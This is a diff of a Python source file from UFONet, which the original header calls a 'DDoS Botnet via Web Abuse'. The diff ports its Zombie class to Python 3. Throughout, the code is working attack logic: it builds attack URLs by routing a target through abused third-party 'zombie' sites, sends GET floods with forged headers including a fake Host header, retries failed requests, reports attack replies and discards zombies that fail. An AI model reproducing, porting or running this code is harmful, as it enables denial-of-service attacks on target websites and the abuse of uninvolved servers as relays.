@@ -1,20 +1,21 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python3 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2013/2018 - by psy (epsylon@riseup.net)
+This file is part of the UFONet project, https://ufonet.03c8.net
+
+Copyright (c) 2013/2020 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import StringIO, md5, re, sys
+import io, hashlib, re, sys
 import time, threading, random
-from randomip import RandomIP
-
+from .randomip import RandomIP
 try:
     import pycurl
 except:
-    print "\nError importing: pycurl lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-pycurl' or 'pip install pycurl'\n"
+    print("\nError importing: pycurl lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-pycurl'\n")
     sys.exit(2)
 
 class Zombie: # class representing a zombie
@@ -28,7 +29,7 @@ class Zombie: # class representing a zombie
         self.zombie = zombie
         self.connection_failed=True
 
-    # wait for semaphore to be ready, add to herd, connect & suicide
+    # wait for semaphore to be ready, add to herd, connect & suicide!
     def connect(self):
         reply=None
         with self.ufo.sem:
@@ -78,7 +79,7 @@ class Zombie: # class representing a zombie
             else:                                    
                 url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
             if self.ufo.options.verbose:
-                print "[Info] [Zombies] Payload:", url_attack
+                print("[Info] [Zombies] Payload:", url_attack)
             c.setopt(pycurl.URL, url_attack) # GET connection on target site
             c.setopt(pycurl.NOBODY, 0)  # use GET
         # set fake headers (important: no-cache)
@@ -114,9 +115,9 @@ class Zombie: # class representing a zombie
             host_fakevalue = ['Host: ' + str(options.host)]
             fakeheaders = fakeheaders + host_fakevalue
         c.setopt(pycurl.HTTPHEADER, fakeheaders) # set fake headers
-        b = StringIO.StringIO()
+        b = io.BytesIO()
         c.setopt(pycurl.HEADERFUNCTION, b.write)
-        h = StringIO.StringIO()
+        h = io.BytesIO()
         c.setopt(pycurl.WRITEFUNCTION, h.write)
         if options.agent: # set user-agent
             c.setopt(pycurl.USERAGENT, options.agent)
@@ -146,8 +147,8 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.TIMEOUT, options.timeout)
             c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
         else:
-            c.setopt(pycurl.TIMEOUT, 1) # low value trying to control OS/python overflow when too many threads are open
-            c.setopt(pycurl.CONNECTTIMEOUT, 1)
+            c.setopt(pycurl.TIMEOUT, 5) # low value trying to control OS/python overflow when too many threads are open
+            c.setopt(pycurl.CONNECTTIMEOUT, 5)
         if options.delay: # set delay
             self.ufo.delay = options.delay
         else:
@@ -160,7 +161,7 @@ class Zombie: # class representing a zombie
             c.perform()
             time.sleep(self.ufo.delay)
             self.connection_failed = False
-        except Exception, e: # try retries
+        except Exception as e: # try retries
             for count in range(0, self.ufo.retries):
                 time.sleep(self.ufo.delay)
                 try:
@@ -170,34 +171,37 @@ class Zombie: # class representing a zombie
                     self.connection_failed = True
         if self.ufo.head == True: # HEAD reply
             code_reply = c.getinfo(pycurl.HTTP_CODE)
-            reply = b.getvalue()
-            if options.verbose:
-                print "[Info] [AI] HEAD Reply:"
-                print "\n", reply
+            reply = b.getvalue().decode('utf-8')
+            if reply:
+                if options.verbose:
+                    print("[Info] [AI] HEAD Reply:")
+                    print("\n"+ reply)
             if self.ufo.options.testrpc:
                 return reply
             else:
                 return code_reply
         if self.ufo.external == True: # External reply
-            external_reply = h.getvalue()
-            if options.verbose:
-                print "[Info] [AI] EXTERNAL Reply:"
-                print "\n", external_reply
+            external_reply = h.getvalue().decode('utf-8')
+            if external_reply:
+                if options.verbose:
+                    print("[Info] [AI] EXTERNAL Reply:")
+                    print("\n"+ external_reply)
             return external_reply
         if self.payload == True: # Payloads reply
-            payload_reply = h.getvalue()
-            if options.verbose:
-                print "[Info] [AI] PAYLOAD Reply:"
-                print "\n", payload_reply
+            payload_reply = h.getvalue().decode('utf-8')
+            if payload_reply:
+                if options.verbose:
+                    print("[Info] [AI] PAYLOAD Reply:")
+                    print("\n"+ payload_reply)
             return payload_reply
         if self.attack_mode == True: # Attack mode reply
-            attack_reply = h.getvalue()
+            attack_reply = h.getvalue().decode('utf-8')
             reply_code = c.getinfo(c.RESPONSE_CODE)
             if options.verbose:
-                print "[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(c.getinfo(c.TOTAL_TIME))+" | Size: " + str(len(attack_reply))+")"
+                print("[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(c.getinfo(c.TOTAL_TIME))+" | Size: " + str(len(attack_reply))+")")
                 time.sleep(5) # managing screen (multi-threading flow time compensation)
             if len(attack_reply) == 0:
-                print "[Info] [Zombies] " + self.zombie + " -> FAILED (cannot connect!)"
+                print("[Info] [Zombies] " + self.zombie + " -> FAILED (cannot connect!)")
                 if not self.ufo.options.disablepurge: # when purge mode discard failed zombie
                     self.ufo.discardzombies.append(self.zombie)
                     self.ufo.num_discard_zombies = self.ufo.num_discard_zombies + 1
